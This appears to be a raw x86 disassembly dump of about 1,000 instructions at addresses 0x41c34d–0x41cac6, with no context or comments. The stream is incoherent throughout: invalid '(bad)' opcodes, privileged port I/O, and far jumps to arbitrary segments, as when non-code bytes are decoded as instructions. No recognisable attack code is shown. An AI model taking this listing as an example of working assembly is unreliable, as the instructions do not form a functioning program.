  41c34d:	call   0x1bc:0xe3dc3bd3
  41c354:	mov    ecx,0xe43e60ee
  41c359:	mov    ds:0xebb64aa,al
  41c35e:	enter  0x8ef1,0x22
  41c362:	xor    edx,ebx
  41c364:	push   cs
  41c365:	pop    edi
  41c366:	aas    
  41c367:	ret    
  41c368:	rcr    edi,cl
  41c36a:	sub    al,0x2d
  41c36c:	jo     0x41c343
  41c36e:	hlt    
  41c36f:	mov    cl,0x14
  41c371:	out    0xf0,al
  41c373:	sub    eax,0xf93f39c2
  41c378:	cmc    
  41c379:	popf   
  41c37a:	hlt    
  41c37b:	sbb    BYTE PTR [ebx-0x19],0x27
  41c37f:	xor    al,0x4e
  41c381:	add    eax,0x72778bb9
  41c386:	fstp   QWORD PTR [edi+0x44]
  41c389:	(bad)  
  41c38a:	pop    esi
  41c38b:	push   ebx
  41c38c:	xchg   edx,eax
  41c38d:	pushf  
  41c38e:	mov    esi,edx
  41c390:	fst    QWORD PTR [edi-0xd10cd83]
  41c396:	fbstp  TBYTE PTR [ecx+ebx*4-0x7d855968]
  41c39d:	dec    esi
  41c39e:	cmp    edx,ebx
  41c3a0:	mov    cl,0x34
  41c3a2:	push   esi
  41c3a3:	and    al,0xfe
  41c3a5:	(bad)  
  41c3a6:	stc    
  41c3a7:	test   DWORD PTR ds:[esi],ebp
  41c3aa:	add    DWORD PTR [eax],eax
  41c3ac:	fcom   QWORD PTR [edx-0x2ee1c8b6]
  41c3b2:	sahf   
  41c3b3:	mov    al,ds:0x2b3ccb1
  41c3b8:	add    ebx,DWORD PTR [edx-0x2a14bc6c]
  41c3be:	sbb    edx,DWORD PTR [ebx+0x7d]
  41c3c1:	or     esi,ecx
  41c3c3:	neg    DWORD PTR [edi+eiz*2+0x38]
  41c3c7:	(bad)  
  41c3c8:	(bad)  
  41c3c9:	test   BYTE PTR [esi],0x45
  41c3cc:	xlat   BYTE PTR ds:[ebx]
  41c3cd:	scas   al,BYTE PTR es:[edi]
  41c3ce:	jecxz  0x41c3cf
  41c3d0:	rol    BYTE PTR [esi],0xc4
  41c3d3:	(bad)  
  41c3d4:	or     edi,DWORD PTR [eax-0x73656b9e]
  41c3da:	mov    al,ds:0xea1373f1
  41c3df:	je     0x41c45c
  41c3e1:	out    0x97,eax
  41c3e3:	pop    edi
  41c3e4:	scas   al,BYTE PTR es:[edi]
  41c3e5:	les    eax,FWORD PTR ds:0x7889d473
  41c3eb:	inc    edx
  41c3ec:	enter  0x404e,0x94
  41c3f0:	cdq    
  41c3f1:	sbb    al,0x66
  41c3f3:	inc    esi
  41c3f4:	push   ecx
  41c3f5:	out    dx,al
  41c3f6:	xor    bh,ch
  41c3f8:	js     0x41c405
  41c3fa:	mov    cl,0xd9
  41c3fc:	adc    BYTE PTR [esi+0x4c9d5078],dl
  41c402:	inc    ebp
  41c403:	dec    ebp
  41c404:	mul    DWORD PTR [esi]
  41c406:	jnp    0x41c3d7
  41c408:	sbb    eax,0x829a136a
  41c40d:	mov    edx,0xd7c4e6ea
  41c412:	sub    al,0x81
  41c414:	or     BYTE PTR [edi],0xfb
  41c417:	sbb    ah,BYTE PTR [edi+0x1]
  41c41a:	jmp    0xd280f577
  41c41f:	pop    edi
  41c420:	sbb    al,BYTE PTR [esi+0x5c0a6d38]
  41c426:	out    dx,al
  41c427:	bound  ecx,QWORD PTR [esi]
  41c429:	shr    dh,0xa9
  41c42c:	(bad)  [ecx+0x2f]
  41c42f:	jmp    0x7d06:0xf2a70a1d
  41c436:	test   bl,ch
  41c438:	arpl   cx,dx
  41c43a:	adc    DWORD PTR [edx-0x16414be1],ecx
  41c440:	in     al,dx
  41c441:	je     0x41c3ff
  41c443:	rcr    DWORD PTR [edi],cl
  41c445:	ins    BYTE PTR es:[edi],dx
  41c446:	xchg   ecx,eax
  41c447:	jmp    0x72e4:0xfb1385cc
  41c44e:	js     0x41c4ab
  41c450:	push   edx
  41c451:	xchg   ebx,eax
  41c452:	mov    eax,0x662ab411
  41c457:	add    dl,BYTE PTR [edi-0x75]
  41c45a:	fcomi  st,st(7)
  41c45c:	cmc    
  41c45d:	mov    ds:0xac64abc8,eax
  41c462:	mov    eax,ds:0x496f11ff
  41c467:	pop    ebx
  41c468:	mov    ds:0x2d32a894,al
  41c46d:	scas   eax,DWORD PTR es:[edi]
  41c46e:	jmp    0x9fb:0x2c9b135b
  41c475:	mov    eax,0xda42ddf3
  41c47a:	sub    al,0xd
  41c47c:	xchg   esi,eax
  41c47d:	and    al,0x95
  41c47f:	cmp    BYTE PTR [ebp+0x26df2853],dl
  41c485:	sti    
  41c486:	jge    0x41c447
  41c488:	inc    edx
  41c489:	inc    eax
  41c48a:	loop   0x41c448
  41c48c:	enter  0xa4f8,0x10
  41c490:	push   ds
  41c491:	push   esp
  41c492:	fdivp  st(7),st
  41c494:	icebp  
  41c495:	or     eax,eax
  41c497:	jbe    0x41c4a8
  41c499:	add    cl,BYTE PTR [edx]
  41c49b:	sbb    ch,ah
  41c49d:	inc    esp
  41c49e:	mov    edx,0x5f3fb529
  41c4a3:	mov    dl,0xeb
  41c4a5:	xor    BYTE PTR [ebx],ah
  41c4a7:	(bad)  
  41c4a8:	iret   
  41c4a9:	mov    eax,0x77e9c5ac
  41c4ae:	jmp    0x41c4dd
  41c4b0:	jl     0x41c47a
  41c4b2:	das    
  41c4b3:	mov    ch,0xdd
  41c4b5:	neg    DWORD PTR [ebx-0x50]
  41c4b8:	retf   
  41c4b9:	ins    DWORD PTR es:[edi],dx
  41c4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4bb:	add    ch,BYTE PTR [edi+0x76]
  41c4be:	in     al,dx
  41c4bf:	pop    es
  41c4c0:	add    edi,edi
  41c4c2:	add    DWORD PTR [esi],ecx
  41c4c4:	jmp    0x41c52b
  41c4c6:	aaa    
  41c4c7:	push   esp
  41c4c8:	mov    dl,0xa0
  41c4ca:	fwait
  41c4cb:	jl     0x41c456
  41c4cd:	retf   
  41c4ce:	jns    0x41c47c
  41c4d0:	mov    bh,0xee
  41c4d2:	inc    esp
  41c4d3:	and    edi,DWORD PTR [esi]
  41c4d5:	loope  0x41c492
  41c4d7:	dec    edi
  41c4d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4d9:	int3   
  41c4da:	ins    DWORD PTR es:[edi],dx
  41c4db:	adc    DWORD PTR [edx-0x4f],edi
  41c4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4df:	cmp    ah,cl
  41c4e1:	push   ecx
  41c4e2:	out    dx,eax
  41c4e3:	gs push ebx
  41c4e5:	cmc    
  41c4e6:	les    eax,FWORD PTR ds:0xe7e7066d
  41c4ec:	call   0xab5d:0xc05dfcf9
  41c4f3:	int3   
  41c4f4:	arpl   bx,cx
  41c4f6:	mov    al,0xda
  41c4f8:	div    BYTE PTR [edx]
  41c4fa:	das    
  41c4fb:	call   0xae770ff8
  41c500:	(bad)  
  41c501:	jp     0x41c55d
  41c503:	push   ebp
  41c504:	pop    es
  41c505:	and    bl,BYTE PTR [esi+0x35]
  41c508:	dec    esi
  41c509:	out    0x63,al
  41c50b:	test   BYTE PTR [ebx],bh
  41c50d:	(bad)  
  41c50f:	test   ecx,ebp
  41c511:	dec    ebx
  41c512:	cmp    eax,0x5feca6a3
  41c517:	rol    DWORD PTR [ecx-0x13],1
  41c51a:	dec    ebx
  41c51b:	retf   0xd6
  41c51e:	cmp    eax,0x57e7c0c
  41c523:	lahf   
  41c524:	mov    ds:0x8ab677b6,al
  41c529:	out    0x5d,al
  41c52b:	and    eax,0xac05117f
  41c530:	sahf   
  41c531:	dec    ecx
  41c532:	xor    BYTE PTR [ebp+ecx*2+0x301a8a68],bh
  41c539:	ret    
  41c53a:	call   0x1b0393d7
  41c53f:	xchg   ebx,eax
  41c540:	adc    BYTE PTR [edx],dh
  41c542:	adc    bl,ch
  41c544:	push   cs
  41c545:	fxch   st(5)
  41c547:	mov    DWORD PTR [eax-0x6e5f389c],esp
  41c54d:	and    eax,0xa45d3543
  41c552:	cmp    edx,DWORD PTR [edi-0x20]
  41c555:	xchg   esp,eax
  41c556:	dec    edx
  41c557:	adc    bh,BYTE PTR [esi-0x4072d9f1]
  41c55d:	or     ecx,0xffffff80
  41c560:	mov    dl,0x8b
  41c562:	ins    BYTE PTR es:[edi],dx
  41c563:	adc    eax,0x4434c275
  41c568:	jecxz  0x41c4f0
  41c56a:	dec    ecx
  41c56b:	inc    ecx
  41c56c:	cdq    
  41c56d:	cmc    
  41c56e:	and    esi,DWORD PTR [esi-0x41abb331]
  41c574:	cwde   
  41c575:	or     eax,0x251049e8
  41c57a:	neg    BYTE PTR [edx-0x8]
  41c57d:	or     eax,0x7f75904b
  41c582:	retf   
  41c583:	dec    edx
  41c584:	imul   esi,DWORD PTR [edx],0x99623fa8
  41c58a:	pop    ss
  41c58b:	sub    eax,0xe0529009
  41c590:	das    
  41c591:	mov    edi,0x32ee5e5f
  41c596:	(bad)  
  41c597:	into   
  41c598:	hlt    
  41c599:	dec    ecx
  41c59a:	js     0x41c55c
  41c59c:	pop    edi
  41c59d:	rcl    DWORD PTR [esi+ebx*1-0x30],0xae
  41c5a2:	cmp    al,BYTE PTR [edi+0x75]
  41c5a5:	(bad)  
  41c5a6:	out    0x2c,al
  41c5a8:	adc    BYTE PTR ds:0x413a37ad,0xb
  41c5af:	cmc    
  41c5b0:	or     eax,0x10b8286b
  41c5b5:	jmp    0xfee7c679
  41c5ba:	retf   0x1d3
  41c5bd:	int    0xbf
  41c5bf:	aas    
  41c5c0:	pop    ecx
  41c5c1:	jmp    0x41c54f
  41c5c3:	rol    BYTE PTR [edi+0x332fcc6a],1
  41c5c9:	mov    bl,0xd7
  41c5cb:	pop    edi
  41c5cc:	and    ah,al
  41c5ce:	sahf   
  41c5cf:	test   DWORD PTR [edx+esi*4+0x23],edx
  41c5d3:	mov    bl,0x5b
  41c5d5:	in     al,dx
  41c5d6:	push   es
  41c5d7:	adc    BYTE PTR [edi],0x3a
  41c5da:	or     eax,0xd8053864
  41c5df:	mov    bl,0x67
  41c5e1:	and    eax,0xf7ef0022
  41c5e6:	xchg   esp,eax
  41c5e7:	inc    ecx
  41c5e8:	xchg   edi,eax
  41c5e9:	fcmove st,st(6)
  41c5eb:	xchg   esp,eax
  41c5ec:	mov    al,BYTE PTR [ebp-0x51]
  41c5ef:	addr16 jge 0x41c583
  41c5f2:	aaa    
  41c5f3:	sub    eax,0x418d4424
  41c5f8:	out    dx,eax
  41c5f9:	stc    
  41c5fa:	push   ebx
  41c5fb:	aam    0xc1
  41c5fd:	xor    edx,DWORD PTR [edx]
  41c5ff:	sub    al,0xb8
  41c601:	cmp    cl,BYTE PTR ds:0xcec2a150
  41c607:	push   0xbf33b83b
  41c60c:	call   0xcfbfbf73
  41c611:	pop    ss
  41c612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c613:	mov    al,0x19
  41c615:	lds    ebx,FWORD PTR [edi]
  41c617:	xchg   ebx,eax
  41c618:	or     DWORD PTR [esi-0x7f4787e6],eax
  41c61e:	lahf   
  41c61f:	out    dx,eax
  41c620:	mov    ecx,0x393c421a
  41c625:	inc    edi
  41c626:	push   ebp
  41c627:	and    al,0x31
  41c629:	adc    eax,0x8ef3381
  41c62e:	cmp    al,0x98
  41c630:	mov    cs,WORD PTR [esi+esi*1]
  41c633:	mov    edx,0xf55cd4d3
  41c638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c639:	push   ds
  41c63a:	scas   al,BYTE PTR es:[edi]
  41c63b:	sbb    eax,0x3d9e1ba2
  41c640:	or     DWORD PTR [edi-0x37a50119],eax
  41c646:	in     al,0xa6
  41c648:	call   0xd96e0d1c
  41c64d:	or     DWORD PTR [edi],edi
  41c64f:	dec    eax
  41c650:	add    al,0xd3
  41c652:	in     al,0x76
  41c654:	dec    esi
  41c655:	pop    ss
  41c656:	dec    ecx
  41c657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c658:	xor    cl,ah
  41c65a:	mov    edi,0x780bef54
  41c65f:	call   0x83f513d1
  41c664:	call   0xc9a1:0xb905787c
  41c66b:	fsubr  QWORD PTR [edx+ecx*2-0x3b]
  41c66f:	push   cs
  41c670:	push   edi
  41c671:	pusha  
  41c672:	ret    
  41c673:	cdq    
  41c674:	sbb    al,0x7d
  41c676:	pop    esi
  41c677:	ds loope 0x41c6ef
  41c67a:	push   0xffffffac
  41c67c:	sti    
  41c67d:	rcl    esp,0xa0
  41c680:	sahf   
  41c681:	jnp    0x41c670
  41c683:	jae    0x41c6e1
  41c685:	and    eax,DWORD PTR [ebx]
  41c687:	xlat   BYTE PTR ds:[ebx]
  41c688:	aas    
  41c689:	cs mov esi,0x26dc54f5
  41c68f:	push   es
  41c690:	push   ecx
  41c691:	loope  0x41c640
  41c693:	repnz (bad) 
  41c695:	icebp  
  41c696:	mov    dh,0xed
  41c698:	mov    ds:0x2404fcf0,eax
  41c69d:	in     eax,dx
  41c69e:	fimul  DWORD PTR [ebx-0xb]
  41c6a1:	add    DWORD PTR [edi-0x1f],edi
  41c6a4:	mov    esi,0x547669f3
  41c6a9:	xchg   BYTE PTR ds:0x314df5ca,dl
  41c6af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6b0:	lods   al,BYTE PTR ds:[esi]
  41c6b1:	dec    ebp
  41c6b2:	fucomip st,st(7)
  41c6b4:	cmp    edi,ecx
  41c6b6:	fs push ds
  41c6b8:	xor    eax,0x4f5d9298
  41c6bd:	loop   0x41c685
  41c6bf:	xor    al,0x4f
  41c6c1:	sub    bh,BYTE PTR [edx+0x28]
  41c6c4:	jne    0x41c6a8
  41c6c6:	das    
  41c6c7:	in     eax,0x85
  41c6c9:	push   eax
  41c6ca:	outs   dx,BYTE PTR ds:[esi]
  41c6cb:	push   ecx
  41c6cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6cd:	clc    
  41c6ce:	sbb    ebx,0x297d1b7c
  41c6d4:	mov    al,0x9e
  41c6d6:	popf   
  41c6d7:	push   ebp
  41c6d8:	shr    DWORD PTR [esi+edx*4],cl
  41c6db:	mov    eax,0x4e705625
  41c6e0:	jne    0x41c741
  41c6e2:	inc    ebx
  41c6e3:	fdiv   QWORD PTR [ebx+0x1d007c5e]
  41c6e9:	cmp    BYTE PTR [ecx-0x2afbf6a9],dh
  41c6ef:	lds    esp,FWORD PTR [ecx+0x25]
  41c6f2:	inc    ebx
  41c6f3:	push   ss
  41c6f4:	test   BYTE PTR [ecx+0x1a],dh
  41c6f7:	cwde   
  41c6f8:	or     ebx,DWORD PTR [ecx+0x5]
  41c6fb:	or     bl,BYTE PTR [eax+eiz*4+0x60e84a2f]
  41c702:	mov    ah,0x53
  41c704:	jne    0x41c73f
  41c706:	sub    edi,DWORD PTR [ebx+0x496f7780]
  41c70c:	int    0xc5
  41c70e:	or     ecx,edi
  41c710:	ds mov ebp,0x3f399aac
  41c716:	dec    edx
  41c717:	and    DWORD PTR [edx],ecx
  41c719:	scas   al,BYTE PTR es:[edi]
  41c71a:	sub    dh,dl
  41c71c:	jg     0x41c72c
  41c71e:	sahf   
  41c71f:	adc    DWORD PTR [ebx],esi
  41c721:	popa   
  41c722:	mov    dl,0xae
  41c724:	out    dx,eax
  41c725:	bound  esi,QWORD PTR [ecx-0x1607b712]
  41c72b:	jae    0x41c762
  41c72d:	jecxz  0x41c7a0
  41c72f:	cmp    eax,DWORD PTR [edx+ecx*1]
  41c732:	data16 sahf 
  41c734:	lds    ebp,FWORD PTR ds:0xdf6246a6
  41c73a:	into   
  41c73b:	adc    esp,edi
  41c73d:	inc    edx
  41c73e:	fs cs jecxz 0x41c7b8
  41c742:	arpl   WORD PTR [eax+0x45],sp
  41c745:	sub    DWORD PTR [ebx],edi
  41c747:	out    0xb7,eax
  41c749:	in     al,0x41
  41c74b:	dec    eax
  41c74c:	loop   0x41c757
  41c74e:	xchg   ecx,eax
  41c74f:	jae    0x41c77d
  41c751:	fst    DWORD PTR [eax-0x20]
  41c754:	cwde   
  41c755:	test   al,0x50
  41c757:	pop    edi
  41c758:	push   edi
  41c759:	pop    esi
  41c75a:	mov    ebx,0xbff79121
  41c75f:	xor    eax,0x5f29ed39
  41c764:	dec    edi
  41c765:	cwde   
  41c766:	push   edi
  41c767:	xchg   ebp,eax
  41c768:	cmp    esp,DWORD PTR ds:0x9ea4b2c
  41c76e:	sub    al,0xb8
  41c770:	ins    BYTE PTR es:[edi],dx
  41c771:	out    0x1d,al
  41c773:	aad    0x79
  41c775:	int    0xcc
  41c777:	or     al,0x61
  41c779:	lods   al,BYTE PTR ds:[esi]
  41c77a:	out    dx,al
  41c77b:	test   DWORD PTR [esi+0x50],ebx
  41c77e:	mov    eax,DWORD PTR [ecx+0x78]
  41c781:	cli    
  41c782:	adc    al,0xf0
  41c784:	cld    
  41c785:	inc    esi
  41c786:	mov    bl,0x5d
  41c788:	sub    al,0xfc
  41c78a:	sar    BYTE PTR [ebx+0x78fdda81],cl
  41c790:	mov    ds:0xc7deeec,eax
  41c795:	mov    ah,0xfe
  41c797:	(bad)  
  41c798:	loop   0x41c803
  41c79a:	int3   
  41c79b:	xor    ebp,DWORD PTR [ebx]
  41c79d:	popa   
  41c79e:	dec    edx
  41c79f:	je     0x41c7d6
  41c7a1:	mov    BYTE PTR ds:[esp+edx*8],bh
  41c7a5:	pop    ebx
  41c7a6:	mov    ah,0x82
  41c7a8:	mov    edi,0xe6d7d618
  41c7ad:	cli    
  41c7ae:	mov    ds:0x2cbfe822,al
  41c7b3:	push   0x149bab65
  41c7b8:	mov    edx,0x1bf27d98
  41c7bd:	pop    esp
  41c7be:	nop
  41c7bf:	jae    0x41c7f6
  41c7c1:	pop    ebx
  41c7c2:	cmp    eax,DWORD PTR [edi+ebp*4+0x2e]
  41c7c6:	or     esi,DWORD PTR ds:0x957ad545
  41c7cc:	outs   dx,DWORD PTR ds:[esi]
  41c7cd:	(bad)  
  41c7cf:	dec    edi
  41c7d0:	pop    eax
  41c7d1:	hlt    
  41c7d2:	pusha  
  41c7d3:	retf   0x8e10
  41c7d6:	pcmpgtw mm6,QWORD PTR [esi+0x31bc26e7]
  41c7dd:	popf   
  41c7de:	dec    ebx
  41c7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7e0:	inc    ch
  41c7e2:	jb     0x41c782
  41c7e4:	jbe    0x41c769
  41c7e6:	mov    bh,0x22
  41c7e8:	cwde   
  41c7e9:	outs   dx,BYTE PTR ds:[esi]
  41c7ea:	mov    dl,0x8c
  41c7ec:	fist   DWORD PTR [edi-0x2e839d64]
  41c7f2:	push   esp
  41c7f3:	in     al,0x10
  41c7f5:	push   cs
  41c7f6:	stc    
  41c7f7:	jmp    0xb857c7d4
  41c7fc:	dec    esi
  41c7fd:	cmp    eax,DWORD PTR [ecx-0x7a]
  41c800:	outs   dx,BYTE PTR ds:[esi]
  41c801:	push   ss
  41c802:	adc    eax,0x24a1a00f
  41c807:	bound  esi,QWORD PTR ss:[ebp-0x74]
  41c80b:	loopne 0x41c87d
  41c80d:	out    dx,al
  41c80e:	inc    ecx
  41c80f:	ds stos BYTE PTR es:[edi],al
  41c811:	mov    cl,0x24
  41c813:	popa   
  41c814:	iret   
  41c815:	jae    0x41c814
  41c817:	retf   
  41c818:	aam    0x78
  41c81a:	in     al,dx
  41c81b:	fcom   QWORD PTR [ebx]
  41c81d:	sar    DWORD PTR [edi+eax*1-0x326754fd],1
  41c824:	outs   dx,DWORD PTR ds:[esi]
  41c825:	shl    DWORD PTR [esi+0x74],0x12
  41c829:	aaa    
  41c82a:	clc    
  41c82b:	xchg   DWORD PTR [eax+0x21],esp
  41c82e:	ja     0x41c84b
  41c830:	js     0x41c7be
  41c832:	adc    eax,0x4167e615
  41c837:	xchg   ebp,eax
  41c838:	lahf   
  41c839:	rol    DWORD PTR [edx-0x7548a8d5],0x9b
  41c840:	mov    ebx,0x8740ab21
  41c845:	mov    ecx,0x85da5f47
  41c84a:	pusha  
  41c84b:	mov    ch,0x6c
  41c84d:	nop
  41c84e:	jno    0x41c87a
  41c850:	call   0x2d4f746e
  41c855:	enter  0x193c,0xc8
  41c859:	mov    dl,0x10
  41c85b:	ficomp DWORD PTR [ebx+0x7101364c]
  41c861:	push   0xffffff96
  41c863:	loopne 0x41c81c
  41c865:	adc    BYTE PTR [ebp-0x6505a52e],bl
  41c86b:	sub    ecx,DWORD PTR [ebp+0x14]
  41c86e:	cmp    BYTE PTR [esi+0x110ceb39],dl
  41c874:	ins    DWORD PTR es:[edi],dx
  41c875:	jb     0x41c882
  41c877:	sub    al,0xc5
  41c879:	push   ebx
  41c87a:	sbb    eax,0xaed49c7f
  41c87f:	out    0x56,eax
  41c881:	inc    ecx
  41c882:	in     eax,dx
  41c883:	ret    0x16e6
  41c886:	push   edi
  41c887:	inc    edx
  41c888:	mul    BYTE PTR [eax]
  41c88a:	jae    0x41c81b
  41c88c:	xchg   edx,eax
  41c88d:	push   ds
  41c88e:	adc    eax,0xa92816fd
  41c893:	xor    BYTE PTR [ecx+0x51],dh
  41c896:	push   edx
  41c897:	mov    ecx,0xe51884b4
  41c89c:	mov    eax,ds:0xd658cd23
  41c8a1:	fadd   DWORD PTR [edx]
  41c8a3:	pop    edx
  41c8a4:	sbb    al,0xa6
  41c8a6:	call   0x2b693812
  41c8ab:	add    DWORD PTR [ebp+0x51],esi
  41c8ae:	idiv   DWORD PTR ds:0x7d633cc6
  41c8b4:	mov    al,ds:0x6636a8d7
  41c8b9:	lea    eax,[edx]
  41c8bb:	pop    ebx
  41c8bc:	daa    
  41c8bd:	mov    edi,DWORD PTR [edx]
  41c8bf:	sbb    edi,DWORD PTR [ebx+ebp*8-0x6d84355e]
  41c8c6:	jbe    0x41c8c8
  41c8c8:	jae    0x41c886
  41c8ca:	fldcw  WORD PTR [esi-0x1203c0c2]
  41c8d0:	jno    0x41c8b1
  41c8d2:	or     eax,DWORD PTR [eax-0x1771b71]
  41c8d8:	(bad)  fs:[esi+eiz*1+0x5f7d115e]
  41c8e0:	arpl   WORD PTR [eax-0x3480482a],dx
  41c8e6:	jnp    0x41c8f5
  41c8e8:	ret    0xc2dd
  41c8eb:	mov    BYTE PTR [eax],bl
  41c8ed:	pop    edx
  41c8ee:	lods   eax,DWORD PTR ds:[esi]
  41c8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8f0:	adc    BYTE PTR [esi+edi*2+0x42790af6],al
  41c8f7:	or     ch,BYTE PTR [esi]
  41c8f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8fa:	pop    edx
  41c8fb:	stos   DWORD PTR es:[edi],eax
  41c8fc:	add    dl,ch
  41c8fe:	loop   0x41c909
  41c900:	adc    BYTE PTR [eax*4+0x45636fae],cl
  41c907:	jl     0x41c8e8
  41c909:	xor    DWORD PTR [ecx+ecx*2],0x3a
  41c90d:	mov    al,0xa
  41c90f:	sub    edi,DWORD PTR [edx-0x4a]
  41c912:	sub    BYTE PTR [esi],al
  41c914:	pop    ebx
  41c915:	push   eax
  41c916:	in     al,0xe5
  41c918:	or     cl,BYTE PTR [ebp-0x41d561ca]
  41c91e:	cli    
  41c91f:	imul   esp,DWORD PTR [edx+ecx*1],0xffffffe9
  41c923:	mov    al,0xd1
  41c925:	xchg   edx,eax
  41c926:	arpl   WORD PTR [esi],di
  41c928:	stos   DWORD PTR es:[edi],eax
  41c929:	call   0x17eec683
  41c92e:	cmp    al,0x66
  41c930:	mov    eax,ds:0xde32387c
  41c935:	(bad)  
  41c936:	lock xor bh,BYTE PTR [ebx-0x1]
  41c93a:	cmc    
  41c93b:	xor    ax,0xadb
  41c93f:	sbb    eax,0xd38cfc7f
  41c944:	cmp    edi,ebp
  41c946:	leave  
  41c947:	in     al,0x1c
  41c949:	daa    
  41c94a:	sub    DWORD PTR [ecx+0x65],ebx
  41c94d:	sbb    al,0x46
  41c94f:	test   DWORD PTR [ecx+0x59],0x451f841
  41c956:	sub    al,0x4b
  41c958:	cmp    al,0xf0
  41c95a:	dec    edx
  41c95b:	rcl    ah,cl
  41c95d:	neg    BYTE PTR [ebp+edx*1-0x743fd1a]
  41c964:	xlat   BYTE PTR ds:[ebx]
  41c965:	call   0x33bb:0x9ada0932
  41c96c:	inc    eax
  41c96d:	stc    
  41c96e:	adc    al,0xcd
  41c970:	fld    TBYTE PTR [ebx+eiz*8+0x23]
  41c974:	pop    esi
  41c975:	add    al,0xa
  41c977:	or     eax,0x2fbadbd0
  41c97c:	dec    edx
  41c97d:	or     edx,esp
  41c97f:	cmc    
  41c980:	add    al,0xed
  41c982:	aas    
  41c983:	and    DWORD PTR [ebx+ecx*4-0x760012eb],edx
  41c98a:	pop    esp
  41c98b:	jmp    0xcc9e:0x20a07984
  41c992:	cld    
  41c993:	test   ecx,edi
  41c995:	call   0x9fb8:0xe46112a8
  41c99c:	pop    edx
  41c99d:	lahf   
  41c99e:	retf   0x551a
  41c9a1:	out    dx,al
  41c9a2:	mov    edx,0x28fe9b4d
  41c9a7:	xchg   ebx,eax
  41c9a8:	mov    esi,0x8820b690
  41c9ad:	inc    ebx
  41c9ae:	mov    BYTE PTR [ecx+0x33e8d725],ah
  41c9b4:	lock fstp QWORD PTR [esi]
  41c9b7:	out    dx,al
  41c9b8:	mov    bh,0xe9
  41c9ba:	mov    edx,DWORD PTR [ecx-0x70cc29f1]
  41c9c0:	xchg   ebx,eax
  41c9c1:	loopne 0x41c94d
  41c9c3:	xchg   ebx,eax
  41c9c4:	sar    BYTE PTR [edi+0x693da95],1
  41c9ca:	(bad)  
  41c9cb:	(bad)  
  41c9cc:	cs aas 
  41c9ce:	call   DWORD PTR [esi+eax*4-0x1e13c682]
  41c9d5:	mov    edx,0xb1414803
  41c9da:	cld    
  41c9db:	ret    
  41c9dc:	dec    ecx
  41c9dd:	lea    eax,[ebp-0x3346b3e8]
  41c9e3:	rol    al,0xae
  41c9e6:	mov    dl,0xdf
  41c9e8:	or     eax,0x624f503d
  41c9ed:	fucomip st,st(2)
  41c9ef:	js     0x41c9a8
  41c9f1:	cdq    
  41c9f2:	(bad)  
  41c9f3:	ficom  DWORD PTR [ebp-0x7f2dedec]
  41c9f9:	out    dx,al
  41c9fa:	sahf   
  41c9fb:	jg     0x41c981
  41c9fd:	cmp    al,0x4d
  41c9ff:	comiss xmm5,DWORD PTR [ebx*4-0x1bc7f506]
  41ca07:	xchg   esp,eax
  41ca08:	nop
  41ca09:	push   es
  41ca0a:	iret   
  41ca0b:	push   edi
  41ca0c:	ins    BYTE PTR es:[edi],dx
  41ca0d:	sub    esi,DWORD PTR [ecx-0x5f13180a]
  41ca13:	push   ds
  41ca14:	and    eax,0x3b69f1af
  41ca19:	pcmpgtw mm5,mm6
  41ca1c:	out    0x20,al
  41ca1e:	dec    edx
  41ca1f:	sub    ch,0x7b
  41ca22:	jge    0x41ca37
  41ca24:	sbb    bh,BYTE PTR [esi+0x9]
  41ca27:	cs mov cl,0xf2
  41ca2a:	mov    bh,0x28
  41ca2c:	out    0xf3,al
  41ca2e:	inc    eax
  41ca2f:	loopne 0x41c9db
  41ca31:	imul   esp,eax,0x50
  41ca34:	jbe    0x41caab
  41ca36:	jne    0x41c9e1
  41ca38:	inc    esi
  41ca39:	imul   edi,edx,0xffffffa3
  41ca3c:	push   es
  41ca3d:	jg     0x41ca4b
  41ca3f:	out    dx,eax
  41ca40:	rol    al,1
  41ca42:	out    0x13,eax
  41ca44:	mov    al,ds:0xdbec8d8
  41ca49:	in     eax,dx
  41ca4a:	std    
  41ca4b:	jo     0x41caaf
  41ca4d:	jg     0x41c9fd
  41ca4f:	lods   eax,DWORD PTR ds:[esi]
  41ca50:	cdq    
  41ca51:	jb     0x41c9eb
  41ca53:	or     bh,BYTE PTR [esp-0x44]
  41ca57:	lods   al,BYTE PTR ds:[esi]
  41ca58:	pop    eax
  41ca59:	test   al,0x6a
  41ca5b:	aaa    
  41ca5c:	cmc    
  41ca5d:	lods   al,BYTE PTR ds:[esi]
  41ca5e:	in     eax,dx
  41ca5f:	repnz (bad) 
  41ca61:	pusha  
  41ca62:	or     eax,0xe138e459
  41ca67:	ret    
  41ca68:	mov    ds:0x64e65c9,al
  41ca6d:	or     ah,al
  41ca6f:	dec    edx
  41ca70:	stos   DWORD PTR es:[edi],eax
  41ca71:	mov    dh,0xf5
  41ca73:	bound  eax,QWORD PTR [ebx]
  41ca75:	and    ebx,DWORD PTR [eax-0x79255b64]
  41ca7b:	sub    BYTE PTR [edx-0x98752be],dl
  41ca81:	dec    edi
  41ca82:	push   esp
  41ca83:	enter  0xcacf,0x7
  41ca87:	sub    al,0x39
  41ca89:	xor    al,0xd
  41ca8b:	(bad)  
  41ca8c:	mov    ds:0xc9f2af48,al
  41ca91:	xor    eax,0xed5985d
  41ca96:	dec    edx
  41ca97:	or     bh,0xb6
  41ca9a:	xor    BYTE PTR [ebp-0x7b70ec99],dl
  41caa0:	add    DWORD PTR [ecx],ecx
  41caa2:	or     eax,0xd2e1e52e
  41caa7:	pushf  
  41caa8:	out    dx,eax
  41caa9:	aas    
  41caaa:	jno    0x41cafd
  41caac:	shr    BYTE PTR [edx],0xcb
  41caaf:	push   esp
  41cab0:	sbb    dl,cl
  41cab2:	mov    ebx,0xc1056d17
  41cab7:	lock into 
  41cab9:	sar    dh,1
  41cabb:	jbe    0x41ca87
  41cabd:	pushf  
  41cabe:	jae    0x41cb06
  41cac0:	pop    ss
  41cac1:	or     esp,DWORD PTR [ecx+0x6e]
  41cac4:	jl     0x41cb18
  41cac6:	add    dl,BYTE PTR [ecx]
